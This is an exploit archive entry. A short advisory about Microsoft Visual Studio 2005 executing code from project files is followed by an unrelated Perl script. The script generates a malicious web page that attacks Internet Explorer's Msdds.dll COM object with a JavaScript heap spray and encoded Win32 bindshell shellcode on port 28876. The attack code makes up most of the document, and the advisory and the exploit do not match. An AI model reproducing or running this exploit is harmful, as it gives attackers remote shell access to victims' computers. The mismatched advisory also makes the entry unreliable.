source: http://www.securityfocus.com/bid/16225/info

Microsoft Visual Studio is prone to a vulnerability that could allow remote attackers to execute arbitrary code. This issue stems from a design flaw that executes code contained in a project file without first notifying users.

Exploiting this issue allows attackers to execute arbitrary code in the context of the user viewing a malicious project file. Since viewing a project file is usually considered a safe operation, users may have a false sense of security by attempting to inspect unknown code before compiling or executing it.

This vulnerability may be remotely exploited due to project files originating from untrusted sources.

Visual Studio 2005 is reportedly vulnerable to this issue; other versions may also be affected. 

#!/usr/bin/perl
#######################################################
# 
# Microsoft Internet Explorer "Msdds.dll" Remote Code Execution Exploit 
(0day)
#
# Bindshell on port 28876 - Vulnerability discovered and exploited by 
Anonymous
# 
# PoC code ripped from Berend-Jan Wever's Internet-Exploiter
#
# Vulnerable : EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F (Msdds.dll)
#
# Tested on : Microsoft Internet Explorer 6 SP2 (Windows XP SP2)
#
# Code usage : perl IE-Msddsdll-0day.pl > mypage.html
# 
#######################################################
#
# This program is free software; you can redistribute it and/or modify it 
under
# the terms of the GNU General Public License version 2, 1991 as published 
by
# the Free Software Foundation.
# 
# This program is distributed in the hope that it will be useful, but 
WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
# 
# A copy of the GNU General Public License can be found at:
# http://www.gnu.org/licenses/gpl.html
# or you can write to:
# Free Software Foundation, Inc.
# 59 Temple Place - Suite 330
# Boston, MA 02111-1307
# USA.
#
#######################################################

# header
my $header = "<html><body>\n<SCRIPT language=\"javascript\">\n";

# Win32 bindshell (port 28876) - SkyLined
my $shellcode = "shellcode = unescape(\"%u4343\"+\"%u4343\"+\"%u43eb".
"%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea".
"%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7".
"%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b".
"%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64".
"%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c".
"%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe".
"%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0".
"%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050".
"%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6".
"%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650".
"%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa".
"%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656".
"%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1".
"%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353".
"%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353".
"%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe".
"%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff".
"%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb\");\n";

# Memory 
my $code = "bigblock = unescape(\"%u0D0D%u0D0D\");\n".
"headersize = 20;\n".
"slackspace = headersize+shellcode.length\n".
"while (bigblock.length<slackspace) bigblock+=bigblock;\n".
"fillblock = bigblock.substring(0, slackspace);\n".
"block = bigblock.substring(0, bigblock.length-slackspace);\n".
"while(block.length+slackspace<0x40000) block = block+block+fillblock;\n".
"memory = new Array();\n".
"for (i=0;i<700;i++) memory[i] = block + shellcode;\n".
"</SCRIPT>\n";

# Msdds.dll
my $clsid = 'EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F'; 

# footer
my $footer = "<object 
classid=\"CLSID:".$clsid."\"></object></body></html>\n".
"Microsoft Internet Explorer Msdds.dll COM Object Remote Exploit\n";

# print "Content-Type: text/html;\r\n\r\n"; # if you are in cgi-bin
print "$header $shellcode $code $footer"; 
